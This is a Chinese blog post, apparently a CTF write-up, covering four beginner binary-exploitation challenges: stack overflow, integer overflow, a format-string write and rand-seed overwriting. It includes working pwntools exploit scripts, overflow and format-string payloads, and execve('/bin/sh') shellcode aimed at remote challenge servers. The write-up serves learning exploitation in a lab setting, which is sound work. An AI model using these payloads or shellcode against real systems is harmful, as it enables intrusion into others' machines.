+<h1 id="CGpwn2"><a href="#CGpwn2" class="headerlink" title="CGpwn2"></a>CGpwn2</h1><p>这题好像是一个简单的溢出<br>有用的代码是这里<br><img src="/2019/08/17/攻防世界-新手/cgpwn2-1.GIF" alt="checksec"><br>这里有个fget函数，以及存在漏洞的gets函数。<br>这里的name是全局变量，name 的地址0804A080<br>可以看到这题有system函数，但是没有/bin/sh，要想办法构造，这里可以直接写道全局变量name中，到时候system函数调用时，再用它的首地址作为参数就行了。<br>利用get的溢出，让eip为system的地址，这里可以使用pattern工具来找溢出点IDA上可以看到s是ebp-26h也可以知道是26h+4=42。<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = remote("111.198.29.45",39409)</span></span><br><span class="line">io = process(<span class="string">"./cgpwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./cgpwn2"</span>)  </span><br><span class="line"></span><br><span class="line">sys_addr=elf.symbols[<span class="string">'system'</span>]    </span><br><span class="line"><span class="comment">#sys_addr = 0x08048420</span></span><br><span class="line">io.recvuntil(<span class="string">"your name"</span>)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">bin_sh_addr=<span class="number">0x0804a080</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">42</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">io.recvuntil(<span class="string">"leave some message here:"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/08/17/攻防世界-新手/cgpwn2-2.GIF" alt="checksec"></p>
+<hr>
+<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p><img src="/2019/08/17/攻防世界-新手/int_overflow-1.GIF" alt="checksec"><br>惯例看下，32位的，有NX</p>
+<p><img src="/2019/08/17/攻防世界-新手/int_overflow-2.GIF" alt="checksec"><br>关键地方在这，前面的没有用。<br>从题目名字我们就可以猜到是整数溢出。结合代码中的strlen（s）这个函数。<br>我们需要进入到else里，所以我们要让输入的长度在4-8之间。那应该是要利用溢出。<br>最后一个   <code>result = strcpy(&amp;dest, s);</code> 应该要利用上。感觉是利用最后一个溢出，调用system函数，毕竟程序里有，但是没有/bin/sh，而且没有read函数让你读进去<br>看题解发现，没有找到一个重要的函数，在函数窗口，有一个 what_is_this这个函数。点开一看，这就是flag所在。所以想办法调用这个函数就结束了。<br>通过<code>char dest; // [esp+4h] [ebp-14h]</code>,溢出点是14h+4=24。eip地址写成我们需要的what_is_this函数的4位数地址<br>那我们此时输入的数已经有28（24+4）个了，已经不满足if条件，所以我们就要让字节数溢出<br>计算需要填充的长度：s的长度v3<code>unsigned __int8 v3; // [esp+Fh] [ebp-9h]</code> v3最大值为2的8次方-1=255.260由于溢出（无符号数回绕）实际上是4.因此我们实际的payload总共长度为260-265.   以260为例：后面需要填充的字节就为260-28<br>exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#elf=ELF("./int_over_flow")</span></span><br><span class="line"><span class="comment">#p=process("int_overflow")</span></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">56199</span>)</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x0804868b</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your username:"</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"><span class="comment">##到达目标函数，进入正题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">24</span>+p32(system_addr)+<span class="string">'A'</span>*(<span class="number">260</span><span class="number">-24</span><span class="number">-4</span>)  <span class="comment">##260~265</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your passwd:"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/2019/08/17/攻防世界-新手/int_overflow-flag.GIF" alt="checksec"></h2><h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><p><img src="/2019/08/17/攻防世界-新手/string-1.GIF" alt="checksec"></p>
+<p>找突破口<br><img src="/2019/08/17/攻防世界-新手/string-3.GIF" alt="checksec"><br>执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，<br>回溯发现a1即sub_400D72函数传入的v4，而v4 = (__int64)v3，其中</p>
+<p><img src="/2019/08/17/攻防世界-新手/string-4.GIF" alt="checksec"><br>*v3 = 68;   #即v3[0] = 68;<br>v3[1] = 85;</p>
+<p>也就是说要使a1 == a1[1]，则需要v3 == v3[1]。</p>
+<p>还有可以利用的代码<br><img src="/2019/08/17/攻防世界-新手/string-2.GIF" alt="checksec"></p>
+<p>通过这个格式化字符串漏洞，我们可以令v3的值等于v3【1】从而满足if 的条件进入<br><img src="/2019/08/17/攻防世界-新手/string-5.GIF" alt="checksec"><br>题目已经告诉我们v4的地址了。那我们修改v4的值就好了<br>之后我们想清楚逻辑关系，写exp</p>
+<p>补充：<br>strcmp函数是string compare(字符串比较)的缩写，用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。 [1-2]<br>通过逻辑关系知道，我们前面分别要输入east和1达到sub_400BB9函数。也就是格式化字符串漏洞那里<br><img src="/2019/08/17/攻防世界-新手/string-6.GIF" alt="checksec"></p>
+<p>v3addr = int(p.recvuntil(“\n”),16) #获取v3地址，后16<br>寻找格式化字符串的位置</p>
+<p>我们先是  <code>puts(&quot;&#39;Give me an address&#39;&quot;);</code>这行后面输了个5，然后再<code>puts(&quot;And, you wish is:&quot;);</code>这后面输了AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.<br><img src="/2019/08/17/攻防世界-新手/string-7.GIF" alt="checksec"><br><img src="/2019/08/17/攻防世界-新手/string-8.GIF" alt="checksec"><br>可以知道我们两次输入的地方分别在7，8这两个位置。如果我们把地址放在7这里，那就写$7n;如果是后面输入的地方，那就写$8n.<br>可以写exp了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./string')</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"56536"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>) </span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>),<span class="number">16</span>) <span class="comment">#v3地址</span></span><br><span class="line">log.success(<span class="string">"addr:"</span>+hex(addr))</span><br><span class="line">p.sendlineafter(<span class="string">"be:\n"</span>,<span class="string">"LH"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"up?:\n"</span>,<span class="string">"east"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"leave(0)?:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">##前面都为逻辑关系，现在进入关键部分</span></span><br><span class="line">p.sendlineafter(<span class="string">"address\'\n"</span>, str(addr))</span><br><span class="line">p.sendlineafter(<span class="string">"is:\n"</span>, <span class="string">"%85c%7$n"</span>)  <span class="comment">##将addr所指向的v3，改写成85</span></span><br><span class="line">shellcode=<span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span> </span><br><span class="line">p.sendlineafter(<span class="string">"SPELL\n"</span>,shellcode) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure></p>
+<p>至于将地址和字符串写在同一个print漏洞函数这个办法，我没成功，在组合payload的时候报错。</p>
+<p>参考文章：<a href="https://www.jianshu.com/p/457520f97a76" target="_blank" rel="noopener">https://www.jianshu.com/p/457520f97a76</a></p>
+<hr>
+<h1 id="gues-number"><a href="#gues-number" class="headerlink" title="gues_number"></a>gues_number</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="/2019/08/17/攻防世界-新手/guess_num-1.GIF" alt=""><br>这题好像开的挺多<br>看下代码，发现只要连续猜对10次v7取的随机数，就拿到flag了。这里的突破口应该是在rand，seed这样的伪随机数上。<br><img src="/2019/08/17/攻防世界-新手/guess_num-2.GIF" alt=""><br>这里存在一个gets漏洞函数，可以利用溢出。但是题目有candy和NX所以，不能直接栈溢出到sub_C3E函数</p>
+<p>查看地址</p>
+<p><img src="/2019/08/17/攻防世界-新手/guess_num-3.GIF" alt=""><br>可以看到v7和seed的地址是连续的，差20h<br>用v7覆盖掉seed来控制随机数。<br>理一下思路，利用v7覆盖seed[0],使seed[0]已知，然后循环，然后直接拿flag就好了</p>
+<h2 id="关于rand和srand"><a href="#关于rand和srand" class="headerlink" title="关于rand和srand"></a>关于rand和srand</h2><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br>对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p>
+<h2 id="关于ctype库与dll"><a href="#关于ctype库与dll" class="headerlink" title="关于ctype库与dll"></a>关于ctype库与dll</h2><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p>
+<h2 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h2><p>可以使用ldd查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linhua@linhua-virtual-machine:~/桌面/攻防世界/guess_nume$ ldd guess_num</span><br><span class="line">    linux-vdso.so.1 (0x00007fffaf6de000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9acf1ca000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f9acf7be000)</span><br></pre></td></tr></table></figure></p>
+<p>也可以在脚本中通过elf文件查找<br>elf = ELF(‘./guess_num’)<br>libc = elf.libc</p>
+<p><img src="/2019/08/17/攻防世界-新手/guess_num-1.GIF" alt=""></p>
+<p>参考：<br>链接：<a href="https://www.jianshu.com/p/0bc6c65addfd" target="_blank" rel="noopener">https://www.jianshu.com/p/0bc6c65addfd</a></p>
 
           
         
